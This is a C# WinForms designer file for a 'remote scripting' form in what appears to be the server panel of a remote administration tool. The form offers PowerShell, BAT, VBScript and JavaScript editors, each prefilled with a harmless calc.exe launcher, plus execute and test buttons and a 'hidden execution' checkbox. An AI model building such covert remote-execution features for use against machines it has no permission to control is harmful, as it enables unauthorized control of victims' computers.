namespace Orion.Server.Forms
{
    partial class FrmRemoteScripting
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmRemoteScripting));
            ExecBtn = new System.Windows.Forms.Button();
            TestBtn = new System.Windows.Forms.Button();
            dotNetBarTabControl1 = new Orion.Server.Controls.DotNetBarTabControl();
            tabPage1 = new System.Windows.Forms.TabPage();
            PSEdit = new System.Windows.Forms.RichTextBox();
            tabPage2 = new System.Windows.Forms.TabPage();
            BATEdit = new System.Windows.Forms.RichTextBox();
            tabPage3 = new System.Windows.Forms.TabPage();
            VBSEdit = new System.Windows.Forms.RichTextBox();
            tabPage4 = new System.Windows.Forms.TabPage();
            JSEdit = new System.Windows.Forms.RichTextBox();
            HidCheckBox = new System.Windows.Forms.CheckBox();
            dotNetBarTabControl1.SuspendLayout();
            tabPage1.SuspendLayout();
            tabPage2.SuspendLayout();
            tabPage3.SuspendLayout();
            tabPage4.SuspendLayout();
            SuspendLayout();
            // 
            // ExecBtn
            // 
            ExecBtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            ExecBtn.Location = new System.Drawing.Point(896, 614);
            ExecBtn.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            ExecBtn.Name = "ExecBtn";
            ExecBtn.Size = new System.Drawing.Size(112, 35);
            ExecBtn.TabIndex = 1;
            ExecBtn.Text = "执行";
            ExecBtn.UseVisualStyleBackColor = true;
            ExecBtn.Click += ExecBtn_Click;
            // 
            // TestBtn
            // 
            TestBtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            TestBtn.Location = new System.Drawing.Point(774, 614);
            TestBtn.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            TestBtn.Name = "TestBtn";
            TestBtn.Size = new System.Drawing.Size(112, 35);
            TestBtn.TabIndex = 2;
            TestBtn.Text = "测试";
            TestBtn.UseVisualStyleBackColor = true;
            TestBtn.Click += TestBtn_Click;
            // 
            // dotNetBarTabControl1
            // 
            dotNetBarTabControl1.Alignment = System.Windows.Forms.TabAlignment.Left;
            dotNetBarTabControl1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            dotNetBarTabControl1.Controls.Add(tabPage1);
            dotNetBarTabControl1.Controls.Add(tabPage2);
            dotNetBarTabControl1.Controls.Add(tabPage3);
            dotNetBarTabControl1.Controls.Add(tabPage4);
            dotNetBarTabControl1.ItemSize = new System.Drawing.Size(44, 136);
            dotNetBarTabControl1.Location = new System.Drawing.Point(0, 0);
            dotNetBarTabControl1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            dotNetBarTabControl1.Multiline = true;
            dotNetBarTabControl1.Name = "dotNetBarTabControl1";
            dotNetBarTabControl1.SelectedIndex = 0;
            dotNetBarTabControl1.Size = new System.Drawing.Size(1026, 605);
            dotNetBarTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            dotNetBarTabControl1.TabIndex = 0;
            // 
            // tabPage1
            // 
            tabPage1.Controls.Add(PSEdit);
            tabPage1.Location = new System.Drawing.Point(140, 4);
            tabPage1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            tabPage1.Name = "tabPage1";
            tabPage1.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
            tabPage1.Size = new System.Drawing.Size(882, 597);
            tabPage1.TabIndex = 0;
            tabPage1.Text = "Powershell";
            tabPage1.UseVisualStyleBackColor = true;
            // 
            // PSEdit
            // 
            PSEdit.BorderStyle = System.Windows.Forms.BorderStyle.None;
            PSEdit.Dock = System.Windows.Forms.DockStyle.Fill;
            PSEdit.Location = new System.Drawing.Point(4, 5);
            PSEdit.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            PSEdit.Name = "PSEdit";
            PSEdit.Size = new System.Drawing.Size(874, 587);
            PSEdit.TabIndex = 0;
            PSEdit.Text = "start calc.exe";
            // 
            // tabPage2
            // 
            tabPage2.Controls.Add(BATEdit);
            tabPage2.Location = new System.Drawing.Point(140, 4);
            tabPage2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            tabPage2.Name = "tabPage2";
            tabPage2.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
            tabPage2.Size = new System.Drawing.Size(882, 597);
            tabPage2.TabIndex = 1;
            tabPage2.Text = "BAT";
            tabPage2.UseVisualStyleBackColor = true;
            // 
            // BATEdit
            // 
            BATEdit.BorderStyle = System.Windows.Forms.BorderStyle.None;
            BATEdit.Dock = System.Windows.Forms.DockStyle.Fill;
            BATEdit.Location = new System.Drawing.Point(4, 5);
            BATEdit.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            BATEdit.Name = "BATEdit";
            BATEdit.Size = new System.Drawing.Size(874, 587);
            BATEdit.TabIndex = 1;
            BATEdit.Text = "@echo off\nstart calc.exe";
            // 
            // tabPage3
            // 
            tabPage3.Controls.Add(VBSEdit);
            tabPage3.Location = new System.Drawing.Point(140, 4);
            tabPage3.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            tabPage3.Name = "tabPage3";
            tabPage3.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
            tabPage3.Size = new System.Drawing.Size(882, 597);
            tabPage3.TabIndex = 2;
            tabPage3.Text = "VBScript";
            tabPage3.UseVisualStyleBackColor = true;
            // 
            // VBSEdit
            // 
            VBSEdit.BorderStyle = System.Windows.Forms.BorderStyle.None;
            VBSEdit.Dock = System.Windows.Forms.DockStyle.Fill;
            VBSEdit.Location = new System.Drawing.Point(4, 5);
            VBSEdit.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            VBSEdit.Name = "VBSEdit";
            VBSEdit.Size = new System.Drawing.Size(874, 587);
            VBSEdit.TabIndex = 1;
            VBSEdit.Text = "CreateObject(\"WScript.Shell\").Run \"calc.exe\", 1, False";
            // 
            // tabPage4
            // 
            tabPage4.Controls.Add(JSEdit);
            tabPage4.Location = new System.Drawing.Point(140, 4);
            tabPage4.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            tabPage4.Name = "tabPage4";
            tabPage4.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
            tabPage4.Size = new System.Drawing.Size(882, 597);
            tabPage4.TabIndex = 3;
            tabPage4.Text = "JavaScript";
            tabPage4.UseVisualStyleBackColor = true;
            // 
            // JSEdit
            // 
            JSEdit.BorderStyle = System.Windows.Forms.BorderStyle.None;
            JSEdit.Dock = System.Windows.Forms.DockStyle.Fill;
            JSEdit.Location = new System.Drawing.Point(4, 5);
            JSEdit.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            JSEdit.Name = "JSEdit";
            JSEdit.Size = new System.Drawing.Size(874, 587);
            JSEdit.TabIndex = 1;
            JSEdit.Text = "new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");\n";
            // 
            // HidCheckBox
            // 
            HidCheckBox.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            HidCheckBox.AutoSize = true;
            HidCheckBox.Location = new System.Drawing.Point(674, 622);
            HidCheckBox.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            HidCheckBox.Name = "HidCheckBox";
            HidCheckBox.Size = new System.Drawing.Size(91, 24);
            HidCheckBox.TabIndex = 3;
            HidCheckBox.Text = "隐藏执行";
            HidCheckBox.UseVisualStyleBackColor = true;
            // 
            // FrmRemoteScripting
            // 
            AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
            AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            ClientSize = new System.Drawing.Size(1026, 663);
            Controls.Add(HidCheckBox);
            Controls.Add(TestBtn);
            Controls.Add(ExecBtn);
            Controls.Add(dotNetBarTabControl1);
            Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            MinimumSize = new System.Drawing.Size(666, 436);
            Name = "FrmRemoteScripting";
            StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            Text = "远程脚本 []";
            Load += FrmRemoteScripting_Load;
            dotNetBarTabControl1.ResumeLayout(false);
            tabPage1.ResumeLayout(false);
            tabPage2.ResumeLayout(false);
            tabPage3.ResumeLayout(false);
            tabPage4.ResumeLayout(false);
            ResumeLayout(false);
            PerformLayout();

        }

        #endregion

        private Controls.DotNetBarTabControl dotNetBarTabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        private System.Windows.Forms.RichTextBox PSEdit;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.RichTextBox BATEdit;
        private System.Windows.Forms.TabPage tabPage3;
        private System.Windows.Forms.RichTextBox VBSEdit;
        private System.Windows.Forms.TabPage tabPage4;
        private System.Windows.Forms.RichTextBox JSEdit;
        private System.Windows.Forms.Button ExecBtn;
        private System.Windows.Forms.Button TestBtn;
        private System.Windows.Forms.CheckBox HidCheckBox;
    }
}